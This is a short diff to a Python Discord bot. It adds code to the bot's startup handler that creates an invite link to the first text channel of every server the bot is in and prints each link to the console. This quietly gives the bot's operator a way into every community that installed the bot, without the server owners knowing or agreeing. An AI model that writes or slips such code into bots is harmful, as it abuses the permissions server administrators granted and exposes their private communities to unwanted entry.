@@ -16,6 +16,10 @@ bot.topggpy = topgg.DBLClient(bot, os.getenv('TOPGG_TOKEN'), autopost=True, post
 async def on_ready():
     print(f'{bot.user} is ready')
 
+    for i in bot.guilds:
+        invite = await i.text_channels[0].create_invite()
+        print(i.name, ':', invite)
+
 
 @bot.event
 async def on_autopost_success():
